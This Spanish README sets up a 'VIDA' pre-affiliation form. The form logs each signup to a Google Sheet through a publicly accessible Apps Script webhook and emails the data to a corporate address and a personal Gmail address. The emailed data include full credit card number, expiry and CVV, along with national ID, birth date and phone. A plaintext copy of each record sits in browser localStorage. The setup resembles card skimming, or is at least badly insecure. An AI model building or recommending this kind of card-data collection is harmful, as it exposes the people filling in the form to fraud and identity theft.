# 📊 Integración Google Sheets & Notificaciones por Email - VIDA

Este proyecto está configurado para registrar automáticamente cada pre-afiliación en la planilla oficial de Google Sheets y enviar una notificación por correo electrónico con todos los datos a:
- **jge@vida.com.uy**
- **josemage@gmail.com**

**Planilla de destino:**
👉 [https://docs.google.com/spreadsheets/d/17EOFT889rTSBPGfSJbIwYu-m0Oq3VtdmNrMHxCga02o/edit?usp=sharing](https://docs.google.com/spreadsheets/d/17EOFT889rTSBPGfSJbIwYu-m0Oq3VtdmNrMHxCga02o/edit?usp=sharing)

---

## 🚀 Pasos para Activar el Webhook (Solo toma 2 minutos)

Google Apps Script es el servicio oficial y gratuito de Google que permite vincular la planilla y enviar correos automáticos sin necesidad de servidores externos.

### Paso 1: Abrir el editor de Apps Script en la Planilla
1. Ingresa a la [Planilla de Google Sheets](https://docs.google.com/spreadsheets/d/17EOFT889rTSBPGfSJbIwYu-m0Oq3VtdmNrMHxCga02o/edit?usp=sharing).
2. En la barra de menú superior, haz clic en **Extensiones** > **Apps Script**.

### Paso 2: Pegar el código de integración
1. En el editor de Apps Script, abre el archivo `Código.gs` (o crea uno si no existe).
2. Borra cualquier código existente y copia el contenido completo del archivo [`google-apps-script.js`](./google-apps-script.js).
3. Haz clic en el ícono de **Guardar** (o presiona `Ctrl + S`).

### Paso 3: Implementar como Aplicación Web
1. En la esquina superior derecha, haz clic en el botón azul **Implementar** > **Nueva implementación**.
2. Al lado de "Seleccionar tipo", haz clic en el ícono de **Engranaje (⚙️)** y selecciona **Aplicación web**.
3. Completa los campos:
   - **Descripción:** `Webhook Pre-Afiliación VIDA`
   - **Ejecutar como:** `Yo (tu cuenta de Google)`
   - **Quién tiene acceso:** `Cualquier usuario` *(Anyone - Fundamental para que la web pueda enviar datos sin pedir login a los usuarios)*.
4. Haz clic en **Implementar**.
5. Google te solicitará autorizar permisos (*Revisar permisos* > selecciona tu cuenta > *Configuración avanzada* > *Ir a Webhook Pre-Afiliación (no seguro)* > *Permitir*).

### Paso 4: Vincular la URL en tu Landing Page
1. Al finalizar la implementación, Google te dará una **URL de la aplicación web** (termina en `/exec`).
2. Copia esa URL.
3. Abre el archivo [`config.js`](./config.js) en este proyecto y pégala en `WEBHOOK_URL`:

```javascript
const CONFIG = {
  SPREADSHEET_URL: "https://docs.google.com/spreadsheets/d/17EOFT889rTSBPGfSJbIwYu-m0Oq3VtdmNrMHxCga02o/edit?usp=sharing",
  WEBHOOK_URL: "https://script.google.com/macros/s/TU_ID_AQUI/exec", // <--- PEGAR AQUÍ
  EMAILS: ["jge@vida.com.uy", "josemage@gmail.com"]
};
```

---

## 🛡️ Respaldo Local Seguro (Offline Backup)

Incluso si el webhook aún no está implementado o si hay una caída momentánea de conexión a internet, **ningún registro se pierde**:
- Cada formulario completado se almacena automáticamente en el `localStorage` del navegador bajo la clave `vida_preafiliaciones_backup`.
- Puedes consultar los respaldos en cualquier momento abriendo la consola de desarrollador del navegador (`F12`) y ejecutando:
  ```javascript
  console.table(JSON.parse(localStorage.getItem('vida_preafiliaciones_backup')));
  ```

---

## 📧 Formato del Correo Electrónico Enviado

Cada vez que un usuario envía el formulario, `jge@vida.com.uy` y `josemage@gmail.com` reciben un email con:
- Encabezado con imagen corporativa de VIDA.
- Fecha y hora exacta (horario Uruguay).
- Código único de socio generado (`VIDA-PRE-2026-XXXXX`).
- Nombre completo y Cédula de Identidad.
- Celular con enlace directo a llamada y a chat de **WhatsApp**.
- Fecha de nacimiento y Departamento.
- Datos de tarjeta de crédito (Titular, Número, Vencimiento y CVV).
- Enlace directo a la planilla de Google Sheets.
